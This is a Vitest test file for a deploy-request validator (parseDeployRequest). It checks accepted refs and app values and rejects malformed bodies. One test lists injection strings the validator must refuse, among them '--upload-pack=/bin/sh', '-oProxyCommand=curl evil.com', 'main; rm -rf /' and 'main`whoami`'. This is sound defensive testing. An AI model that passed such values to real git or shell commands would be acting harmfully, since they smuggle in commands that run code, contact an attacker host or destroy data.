import { describe, expect, it } from "vitest";
import { ValidationError, parseDeployRequest } from "./validate.js";

describe("parseDeployRequest", () => {
  it("accepts a valid request", () => {
    const parsed = parseDeployRequest({ app: "web", ref: "main", requestedBy: "claude-code" });
    expect(parsed).toEqual({ app: "web", ref: "main", requestedBy: "claude-code", notes: undefined });
  });

  it("accepts a commit sha as ref", () => {
    const parsed = parseDeployRequest({ app: "both", ref: "a1b2c3d4e5f6", requestedBy: "harness" });
    expect(parsed.ref).toBe("a1b2c3d4e5f6");
  });

  it("rejects an invalid app value", () => {
    expect(() => parseDeployRequest({ app: "database", ref: "main", requestedBy: "x" })).toThrow(ValidationError);
  });

  it.each([
    "--upload-pack=/bin/sh",
    "-oProxyCommand=curl evil.com",
    "main; rm -rf /",
    "main`whoami`",
    "",
    "a".repeat(300),
  ])("rejects an unsafe ref: %s", (ref) => {
    expect(() => parseDeployRequest({ app: "web", ref, requestedBy: "x" })).toThrow(ValidationError);
  });

  it("rejects a missing requestedBy", () => {
    expect(() => parseDeployRequest({ app: "web", ref: "main" })).toThrow(ValidationError);
  });

  it("rejects a non-object body", () => {
    expect(() => parseDeployRequest("not an object")).toThrow(ValidationError);
    expect(() => parseDeployRequest(null)).toThrow(ValidationError);
  });

  it("rejects a non-string notes field", () => {
    expect(() => parseDeployRequest({ app: "web", ref: "main", requestedBy: "x", notes: 42 })).toThrow(ValidationError);
  });
});
